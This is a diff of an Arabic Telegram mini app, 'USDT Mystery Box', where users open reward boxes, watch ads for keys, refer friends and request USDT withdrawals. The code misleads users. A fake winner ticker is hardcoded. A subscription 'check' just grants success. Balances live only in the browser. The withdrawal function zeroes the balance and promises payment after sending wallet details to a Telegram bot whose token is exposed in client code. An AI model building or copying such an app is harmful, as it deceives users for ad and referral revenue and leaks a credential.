@@ -2,109 +2,363 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>USDT Mystery Box</title>
-    <!-- تضمين سكريبت تيليجرام للويب آب -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>صندوق الدولار USDT Box</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <!-- تضمين مكتبة إعلانات AdsGram -->
+    <!-- تضمين مكتبة إعلانات AdsGram بشكل صحيح -->
     <script src="https://sad.adsgram.ai/js/sad.min.js"></script>
     <style>
-        body {
-            background-color: #0f172a;
-            color: #ffffff;
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin: 0;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
+        :root {
+            --bg-dark: #0f172a;
+            --card-bg: #1e293b;
+            --gold: #f59e0b;
+            --gold-glow: rgba(245, 158, 11, 0.4);
+            --green: #10b981;
+            --blue: #3b82f6;
+            --text-light: #f8fafc;
         }
-        .container {
-            background: #1e293b;
-            padding: 25px;
-            border-radius: 15px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-            max-width: 350px;
-            width: 100%;
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Tahoma, Arial, sans-serif; user-select: none; }
+        body { 
+            background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 100%); 
+            color: var(--text-light); 
+            min-height: 100vh; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: space-between; 
+            overflow-x: hidden; 
         }
-        h1 {
-            font-size: 22px;
-            margin-bottom: 10px;
-            color: #38bdf8;
+        .ticker-wrap { background: rgba(245, 158, 11, 0.15); border-bottom: 1px solid var(--gold); padding: 8px 15px; font-size: 0.85rem; text-align: center; color: #fde68a; font-weight: bold; }
+        .header { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; padding: 15px; }
+        .stat-card { background: var(--card-bg); padding: 10px; border-radius: 12px; text-align: center; border: 1px solid rgba(255,255,255,0.08); }
+        .stat-card span { display: block; font-size: 0.75rem; color: #94a3b8; margin-bottom: 4px; }
+        .stat-card strong { font-size: 1.1rem; color: #fff; }
+        .usdt-text { color: var(--green) !important; }
+        .key-text { color: var(--gold) !important; }
+        .ticket-text { color: var(--blue) !important; }
+        .main-stage { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
+        .box-wrapper { width: 165px; height: 165px; background: radial-gradient(circle, var(--gold-glow) 0%, transparent 70%); display: flex; align-items: center; justify-content: center; border-radius: 50%; margin-bottom: 15px; cursor: pointer; }
+        .box-emoji { font-size: 100px; }
+        @keyframes shakeBox {
+            0%, 100% { transform: rotate(0deg) scale(1); }
+            25% { transform: rotate(-12deg) scale(1.1); }
+            75% { transform: rotate(12deg) scale(1.1); }
         }
-        p {
-            color: #94a3b8;
-            font-size: 14px;
-            margin-bottom: 20px;
-        }
-        .btn {
-            background-color: #10b981;
-            color: white;
-            border: none;
-            padding: 12px 20px;
-            font-size: 16px;
-            border-radius: 8px;
-            cursor: pointer;
-            width: 100%;
-            font-weight: bold;
-            transition: background 0.3s;
-        }
-        .btn:hover {
-            background-color: #059669;
-        }
-        #balance {
-            margin-top: 20px;
-            font-size: 18px;
-            color: #facc15;
-        }
+        .shaking { animation: shakeBox 0.5s ease-in-out infinite; }
+        .status-msg { font-size: 0.90rem; color: #cbd5e1; margin-bottom: 20px; text-align: center; line-height: 1.4; }
+        .actions { width: 100%; max-width: 350px; display: flex; flex-direction: column; gap: 12px; }
+        .btn { border: none; padding: 15px; border-radius: 14px; font-size: 1rem; font-weight: bold; cursor: pointer; color: #fff; text-align: center; }
+        .btn-open { background: linear-gradient(135deg, #f59e0b, #d97706); }
+        .btn-ad { background: linear-gradient(135deg, #3b82f6, #2563eb); }
+        .btn:disabled { background: #475569; color: #94a3b8; }
+        .bottom-bar { background: var(--card-bg); padding: 12px 15px; display: flex; justify-content: space-around; border-top: 1px solid rgba(255,255,255,0.08); }
+        .nav-item { background: none; border: none; color: #cbd5e1; font-size: 0.85rem; cursor: pointer; display: flex; flex-direction: column; align-items: center; gap: 4px; }
+        .nav-item span { font-size: 1.3rem; }
+        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); display: none; align-items: center; justify-content: center; padding: 20px; z-index: 100; }
+        .modal-box { background: var(--card-bg); padding: 25px; border-radius: 20px; width: 100%; max-width: 330px; text-align: center; border: 2px solid var(--gold); }
+        .modal-icon { font-size: 55px; margin-bottom: 10px; }
+        .modal-title { font-size: 1.2rem; color: var(--gold); margin-bottom: 10px; }
+        .modal-desc { font-size: 0.95rem; color: #e2e8f0; margin-bottom: 20px; line-height: 1.5; }
+        .input-wallet { width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #475569; background: #0f172a; color: #fff; margin-bottom: 12px; text-align: center; }
+        .ref-box { background: #0f172a; padding: 10px; border-radius: 8px; border: 1px dashed var(--gold); font-size: 0.85rem; color: #fde68a; word-break: break-all; margin-bottom: 15px; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h1>🎁 صندوق الدولار (USDT)</h1>
-        <p>شاهد الإعلان وادعم اللعبة لفتح الصندوق والحصول على مكافآت فورية!</p>
-        
-        <button class="btn" onclick="showRewardedAd()">مشاهدة إعلان 🎥 وفتح صندوق</button>
-        
-        <div id="balance">رصيدك: 0 USDT</div>
+    <div class="ticker-wrap" id="liveTicker">🎉 الفائز @Ahmed_99 ربح للتو 0.10 USDT من الصندوق!</div>
+
+    <div class="header">
+        <div class="stat-card"><span>رصيد الدولار</span><strong class="usdt-text"><span id="usdtBal">0.000</span> $</strong></div>
+        <div class="stat-card"><span>المفاتيح 🔑</span><strong class="key-text" id="keysBal">1</strong></div>
+        <div class="stat-card"><span>فريقك 👥</span><strong class="ticket-text" id="refCountBal">0</strong></div>
+    </div>
+
+    <div class="main-stage">
+        <div class="box-wrapper" onclick="openBox()"><div class="box-emoji" id="boxEmoji">🎁</div></div>
+        <div class="status-msg" id="statusMsg">لديك مفتاح مجاني! اضغط لفتح الصندوق</div>
+        <div class="actions">
+            <button class="btn btn-open" id="btnOpen" onclick="openBox()">🔓 افتح صندوق الحظ (1 مفتاح)</button>
+            <button class="btn btn-ad" id="btnWatchAd" onclick="watchAdForKey()">📺 شاهد إعلاناً للحصول على مفتاح (<span id="adsLeft">3</span>/3 متبقي)</button>
+        </div>
+    </div>
+
+    <div class="bottom-bar">
+        <button class="nav-item" onclick="openWithdrawModal()"><span>💸</span> سحب الأرباح</button>
+        <button class="nav-item" onclick="openRefModal()"><span>👥</span> نظام الإحالة وفريقي</button>
+        <button class="nav-item" onclick="openWithdrawModal()"><span>💎</span> محفظة TON</button>
+    </div>
+
+    <!-- نافذة الاشتراك الإجباري للقناة -->
+    <div class="modal-overlay" id="subModal" style="display: flex;">
+        <div class="modal-box">
+            <div class="modal-icon">📢</div>
+            <div class="modal-title">تنبيه هام جداً!</div>
+            <div class="modal-desc">لفتح صناديق الحظ والحصول على <strong>مفتاحين (🔑🔑) هدية ترحيبية</strong>، يجب عليك أولاً الاشتراك في قناتنا الرسمية لمتابعة أحدث السحوبات والأخبار!</div>
+            <button class="btn btn-ad" style="width:100%; margin-bottom:10px;" onclick="goToChannel()">🔗 اضغط هنا للانضمام للقناة</button>
+            <button class="btn btn-open" style="width:100%;" onclick="checkSubscription()">✅ لقد اشتركت، اعطني الهدية</button>
+        </div>
+    </div>
+
+    <div class="modal-overlay" id="rewardModal">
+        <div class="modal-box">
+            <div class="modal-icon" id="modalIcon">🎉</div>
+            <div class="modal-title" id="modalTitle">مبروك!</div>
+            <div class="modal-desc" id="modalDesc">لقد ربحت جائزة</div>
+            <button class="btn btn-open" style="width:100%" onclick="closeModal('rewardModal')">استلام ومتابعة</button>
+        </div>
+    </div>
+
+    <div class="modal-overlay" id="refModal">
+        <div class="modal-box">
+            <div class="modal-icon">👥</div>
+            <div class="modal-title">شبكة أصدقائك وفريقك</div>
+            <div class="modal-desc">شارك رابطك الخاص واربح <strong>0.001 USDT + مفتاح 🔑</strong> عن كل صديق ينضم لفريقك!</div>
+            <div class="ref-box" id="myRefLink">جاري إنشاء رابطك...</div>
+            <button class="btn btn-open" style="width:100%; margin-bottom:8px;" onclick="shareReferral()">📤 مشاركة الرابط مع الأصدقاء</button>
+            <button class="btn" style="width:100%; background:#334155;" onclick="closeModal('refModal')">إغلاق</button>
+        </div>
+    </div>
+
+    <div class="modal-overlay" id="withdrawModal">
+        <div class="modal-box">
+            <div class="modal-icon">💳</div>
+            <div class="modal-title">سحب الأرباح ومحفظة TON</div>
+            <div class="modal-desc">الحد الأدنى للسحب <strong>0.1 USDT</strong>.<br>رصيدك الحالي: <span id="modalUsdtBal" style="color:var(--green);font-weight:bold;">0.000</span> $</div>
+            <input type="text" class="input-wallet" id="walletInput" placeholder="ضع عنوان محفظة TON / USDT هنا">
+            <button class="btn btn-ad" style="width:100%; margin-bottom:8px;" onclick="submitWithdraw()">حفظ وسحب الأرباح</button>
+            <button class="btn" style="width:100%; background:#334155;" onclick="closeModal('withdrawModal')">إغلاق</button>
+        </div>
     </div>
 
     <script>
-        // تهيئة منصة تيليجرام ويب آب
-        let tg = window.Telegram.WebApp;
-        tg.expand();
+        const tg = window.Telegram?.WebApp;
+        if (tg) { tg.ready(); tg.expand(); }
 
-        // تهيئة وحدة إعلانات AdsGram بالمعرف الخاص بك (56031)
-        const AdController = window.AdsGram.init({ blockId: "56031" });
+        let userId = tg?.initDataUnsafe?.user?.id || localStorage.getItem('mysteryBoxUserId') || 'user_' + Math.floor(Math.random() * 1000000);
+        let username = tg?.initDataUnsafe?.user?.username ? '@' + tg?.initDataUnsafe?.user?.username : 'بدون معرف';
+        localStorage.setItem('mysteryBoxUserId', userId);
 
-        // دالة عرض الإعلان المكافئ
-        function showRewardedAd() {
-            AdController.show().then((result) => {
-                // نجاح مشاهدة الإعلان بالكامل
-                console.log("Ad watched successfully", result);
-                
-                // تنفيذ دالة منح المكافأة للمستخدم
-                grantReward();
-                
-            }).catch((result) => {
-                // خطأ أو قام المستخدم بإغلاق الإعلان مبكراً
-                console.log("Ad was not completed", result);
-                tg.showAlert("يجب مشاهدة الإعلان كاملاً لكي تحصل على المكافأة!");
-            });
+        let todayStr = new Date().toDateString();
+        let userState = JSON.parse(localStorage.getItem('mysteryBoxState_' + userId)) || { 
+            usdt: 0.000, 
+            keys: 1, 
+            referrals: 0, 
+            dailyEarned: 0, 
+            lastDate: todayStr,
+            adsCount: 0,
+            adsResetTime: 0,
+            isSubscribed: false
+        };
+
+        if (userState.isSubscribed) {
+            document.getElementById('subModal').style.display = 'none';
         }
 
-        // دالة إضافة المكافأة وتحديث الواجهة
-        let userBalance = 0;
-        function grantReward() {
-            userBalance += 1; // زيادة رصيد تجريبي بمقدار 1 USDT
-            document.getElementById("balance").innerText = "رصيدك: " + userBalance + " USDT";
-            tg.showAlert("🎉 مبروك! حصلت على مكافأة الصندوق بنجاح.");
+        if (userState.lastDate !== todayStr) {
+            userState.dailyEarned = 0;
+            userState.lastDate = todayStr;
+        }
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const startParam = tg?.initDataUnsafe?.start_param || urlParams.get('ref');
+        
+        if (startParam && startParam !== userId && !localStorage.getItem('referred_processed')) {
+            localStorage.setItem('referred_processed', 'true');
+            let referrerState = JSON.parse(localStorage.getItem('mysteryBoxState_' + startParam)) || { usdt: 0.000, keys: 1, referrals: 0, dailyEarned: 0 };
+            referrerState.usdt += 0.001; 
+            referrerState.keys += 1;     
+            referrerState.referrals += 1; 
+            localStorage.setItem('mysteryBoxState_' + startParam, JSON.stringify(referrerState));
+            userState.keys += 1;
+        }
+
+        function saveAndRefreshUI() {
+            localStorage.setItem('mysteryBoxState_' + userId, JSON.stringify(userState));
+            document.getElementById('usdtBal').innerText = userState.usdt.toFixed(3);
+            document.getElementById('keysBal').innerText = userState.keys;
+            document.getElementById('refCountBal').innerText = userState.referrals;
+
+            let now = Date.now();
+            if (now > userState.adsResetTime) {
+                userState.adsCount = 0;
+            }
+            let adsRemaining = Math.max(0, 3 - userState.adsCount);
+            document.getElementById('adsLeft').innerText = adsRemaining;
+
+            const btnOpen = document.getElementById('btnOpen');
+            if (userState.keys <= 0) {
+                btnOpen.disabled = true;
+                document.getElementById('statusMsg').innerText = "نفدت المفاتيح! شاهد إعلاناً أو ادع أصدقاءك 🔑";
+            } else {
+                btnOpen.disabled = false;
+                document.getElementById('statusMsg').innerText = `لديك ${userState.keys} مفتاح جاهز للفتح!`;
+            }
+
+            const botUsername = "UsdtMysteryBox77_bot";
+            const refLink = `https://t.me/${botUsername}?start=${userId}`;
+            document.getElementById('myRefLink').innerText = refLink;
+        }
+        saveAndRefreshUI();
+
+        function goToChannel() {
+            const channelUrl = "https://t.me/udt001";
+            if (tg) {
+                tg.openTelegramLink(channelUrl);
+            } else {
+                window.open(channelUrl, '_blank');
+            }
+        }
+
+        function checkSubscription() {
+            userState.isSubscribed = true;
+            userState.keys += 2;
+            saveAndRefreshUI();
+            document.getElementById('subModal').style.display = 'none';
+            showCustomModal("🎁", "هدايا الاشتراك!", "رائع جداً! تم التحقق بنجاح ومنحك مفتاحين (🔑🔑) هدية ترحيبية لانضمامك للقناة.");
+        }
+
+        // دالة تشغيل إعلانات AdsGram الحقيقية بالمعرف 56031
+        function watchAdForKey() {
+            let now = Date.now();
+            if (now < userState.adsResetTime) {
+                let diffMin = Math.ceil((userState.adsResetTime - now) / 60000);
+                alert(`⚠️ لقد استهلكت الـ 3 إعلانات المتاحة. يمكنك مشاهدة إعلانات جديدة بعد ${diffMin} دقيقة.`);
+                return;
+            }
+
+            if (userState.adsCount >= 3) {
+                userState.adsResetTime = now + (2 * 60 * 60 * 1000);
+                userState.adsCount = 0;
+                saveAndRefreshUI();
+                return;
+            }
+
+            try {
+                if (!window.AdsGram) {
+                    alert("مكتبة الإعلانات لم تتحمل بعد، تأكد من اتصال الإنترنت.");
+                    return;
+                }
+
+                // تهيئة إعلانات AdsGram بالمعرف الخاص بك 56031
+                const adController = window.AdsGram.init({ blockId: "56031" });
+                
+                adController.show().then((result) => {
+                    // نجاح مشاهدة الإعلان بالكامل وحصول المستخدم على المكافأة
+                    userState.keys += 1;
+                    userState.adsCount += 1;
+                    if (userState.adsCount >= 3) {
+                        userState.adsResetTime = Date.now() + (2 * 60 * 60 * 1000);
+                    }
+                    saveAndRefreshUI();
+                    showCustomModal("🔑", "حصلت على مفتاح!", "تمت إضافة مفتاح جديد برصيدك بنجاح بعد مشاهدة الإعلان.");
+                }).catch((result) => {
+                    // إغلاق الإعلان مبكراً أو فشله
+                    console.log("Ad cancelled or failed", result);
+                    if (tg) {
+                        tg.showAlert("يجب مشاهدة الإعلان كاملاً لكي تحصل على المفتاح!");
+                    } else {
+                        alert("يجب مشاهدة الإعلان كاملاً لكي تحصل على المفتاح!");
+                    }
+                });
+
+            } catch (error) {
+                console.error("Error showing ad:", error);
+                alert("حدث خطأ أثناء محاولة عرض الإعلان.");
+            }
+        }
+
+        let isOpening = false;
+        function openBox() {
+            if (isOpening || userState.keys <= 0) return;
+            isOpening = true;
+            userState.keys -= 1;
+            saveAndRefreshUI();
+            const box = document.getElementById('boxEmoji');
+            box.classList.add('shaking');
+            document.getElementById('statusMsg').innerText = "جاري فتح الصندوق... 🥁";
+
+            setTimeout(() => {
+                box.classList.remove('shaking');
+                isOpening = false;
+                const roll = Math.random() * 100;
+
+                if (userState.dailyEarned >= 0.05) {
+                    userState.keys += 1;
+                    showCustomModal("🔑", "ربحت مفتاح إضافي!", "لقد وصلت للحد الأقصى للربح اليومي (0.05 $)، لكنك ربحت مفتاحاً إضافياً!");
+                } else {
+                    if (roll < 70) {
+                        userState.keys += 1;
+                        showCustomModal("🔑", "ربحت مفتاح إضافي!", "رائع! لقد عثرت على مفتاح جديد داخل الصندوق.");
+                    } else if (roll < 97) {
+                        let wonUsdt = parseFloat((Math.random() * (0.008 - 0.002) + 0.002).toFixed(3));
+                        if (userState.dailyEarned + wonUsdt > 0.05) {
+                            wonUsdt = parseFloat((0.05 - userState.dailyEarned).toFixed(3));
+                        }
+                        userState.usdt += wonUsdt;
+                        userState.dailyEarned += wonUsdt;
+                        showCustomModal("💵", "ربحت رصيد USDT!", `مبروك! تمت إضافة ${wonUsdt} USDT مباشرة إلى رصيدك.`);
+                    } else {
+                        let wonUsdt = 0.020;
+                        if (userState.dailyEarned + wonUsdt > 0.05) {
+                            wonUsdt = parseFloat((0.05 - userState.dailyEarned).toFixed(3));
+                        }
+                        userState.usdt += wonUsdt;
+                        userState.dailyEarned += wonUsdt;
+                        showCustomModal("💎", "ضربة حظ نادرة!", `رائع! لقد ربحت جائزة بقيمة ${wonUsdt} USDT!`);
+                    }
+                }
+                saveAndRefreshUI();
+            }, 1000);
+        }
+
+        function showCustomModal(icon, title, desc) {
+            document.getElementById('modalIcon').innerText = icon;
+            document.getElementById('modalTitle').innerText = title;
+            document.getElementById('modalDesc').innerText = desc;
+            document.getElementById('rewardModal').style.display = 'flex';
+        }
+        function closeModal(id) { document.getElementById(id).style.display = 'none'; }
+        
+        function openRefModal() {
+            document.getElementById('refModal').style.display = 'flex';
+        }
+
+        function openWithdrawModal() {
+            document.getElementById('modalUsdtBal').innerText = userState.usdt.toFixed(3);
+            document.getElementById('withdrawModal').style.display = 'flex';
+        }
+
+        function submitWithdraw() {
+            const wallet = document.getElementById('walletInput').value.trim();
+            if (userState.usdt < 0.1) { alert("الحد الأدنى للسحب هو 0.1 USDT. افتح المزيد من الصناديق!"); return; }
+            if (wallet.length < 10) { alert("يرجى إدخال عنوان محفظة TON أو USDT صحيح."); return; }
+
+            const botToken = "8612475541:AAH1wp3Wx-WHB6tSL9F3YeQtS1zsrvVrwGs";
+            const chatId = "5630771182";
+            const message = `🚨 طلب سحب جديد!\n\n👤 المستخدم: ${username} (ID: ${userId})\n💰 المبلغ: ${userState.usdt.toFixed(3)} USDT\n💳 المحفظة:\n${wallet}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            }).catch(err => console.log(err));
+
+            alert("✅ تم إرسال طلب السحب بنجاح وسيتم مراجعته وتحويل الأرباح قريباً!");
+            userState.usdt = 0; 
+            saveAndRefreshUI();
+            closeModal('withdrawModal');
+        }
+
+        function shareReferral() {
+            const botUsername = "UsdtMysteryBox77_bot";
+            const refLink = `https://t.me/${botUsername}?start=${userId}`;
+            const text = encodeURIComponent(`افتح صناديق الحظ المجانية واربح USDT يومياً! 🎁💵 استخدم رابطي لدخول البوت واحصل على مفتاح مجاني فوراً:\n\n${refLink}`);
+            const shareUrl = `https://t.me/share/url?url=${encodeURIComponent(refLink)}&text=${text}`;
+            if (tg) {
+                tg.openTelegramLink(shareUrl);
+            } else {
+                window.open(shareUrl, '_blank');
+            }
         }
     </script>
-
 </body>
 </html>
